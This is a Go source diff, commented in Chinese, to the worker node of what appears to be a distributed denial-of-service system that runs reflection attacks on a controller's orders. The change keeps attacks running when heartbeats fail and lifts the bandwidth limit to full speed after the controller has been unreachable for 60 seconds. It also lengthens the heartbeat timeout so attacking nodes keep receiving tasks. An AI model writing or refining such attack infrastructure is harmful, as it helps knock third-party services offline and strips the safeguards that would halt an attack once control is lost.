@@ -522,6 +522,23 @@ func (w *Worker) Run(ctx context.Context) error {
 				// 渐进恢复被打断：清零当前档的确认计数
 				w.recoveryOkCount = 0
 
+				// 攻击中：带宽被攻击流量打满是正常现象，心跳失败不代表
+				// Controller 失联。此时绝不降带宽/停攻击——否则攻击刚开打
+				// 就被熔断限到 0.1Mbps，看起来像"摸鱼"。
+				if w.hasActiveTask() {
+					if w.disconnectStart.IsZero() {
+						w.disconnectStart = time.Now()
+					}
+					// 仍保留长断连解限：Controller 真失联 >60s 时让本地池全速
+					if !w.longDisconnect && time.Since(w.disconnectStart) > 60*time.Second {
+						w.longDisconnect = true
+						w.recoveryStep = 0
+						attack.SetGlobalRateLimiter(0, 0)
+						log.Printf("[worker] controller unreachable > 60s during attack — lifting bandwidth limit (local pool attacks at full speed)")
+					}
+					continue // 攻击中不做熔断降级、不进入恢复流程
+				}
+
 				// 长断连检测：controller 失联超过 60s 后，保护控制通道的
 				// 意义消失（带宽已被降级），解除限速让本地反射池全速攻击
 				if w.disconnectStart.IsZero() {
@@ -576,7 +593,9 @@ func (w *Worker) Run(ctx context.Context) error {
 			}
 		case <-recoveryTicker.C:
 			// 长断连解限后不再紧急停攻击（本地池在全力攻击，停掉反而浪费）
-			if inRecovery && !w.longDisconnect && atomic.LoadInt32(&w.heartbeatFailStreak) >= 3 {
+			// 攻击中绝不停止攻击：心跳失败是带宽占满的正常现象，
+			// 停掉攻击会让整个节点在任务中"摸鱼"
+			if inRecovery && !w.longDisconnect && !w.hasActiveTask() && atomic.LoadInt32(&w.heartbeatFailStreak) >= 3 {
 				log.Printf("[worker] CRITICAL: 3+ heartbeat failures, stopping all attacks")
 				w.stopAllAttacks()
 			}
@@ -628,6 +647,12 @@ func (w *Worker) handleHeartbeatFailure(fails int) {
 		attack.SetGlobalRateLimiter(0, 12500)
 		log.Printf("[worker] TX nearly paused (0.1 Mbps)")
 	}
+}
+
+func (w *Worker) hasActiveTask() bool {
+	w.tasksMu.Lock()
+	defer w.tasksMu.Unlock()
+	return len(w.activeTasks) > 0 || len(w.activeComboTasks) > 0
 }
 
 func (w *Worker) stopAllAttacks() {
@@ -760,7 +785,9 @@ func (w *Worker) heartbeat() error {
 	atomic.StoreInt32(&w.lastCPUPercent, stats.CPUPercent)
 	atomic.StoreInt64(&w.lastMemoryMB, stats.MemoryMB)
 
-	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	// 10s 超时：攻击时带宽打满，gRPC 心跳包排队，5s 太紧会频繁超时，
+	// 导致 Controller 把正在攻击的节点误判 OFFLINE，后续任务不再派发给它
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
 	defer cancel()
 	resp, err := w.client.Heartbeat(ctx, &pb.HeartbeatRequest{
 		WorkerId:     w.assignedID,
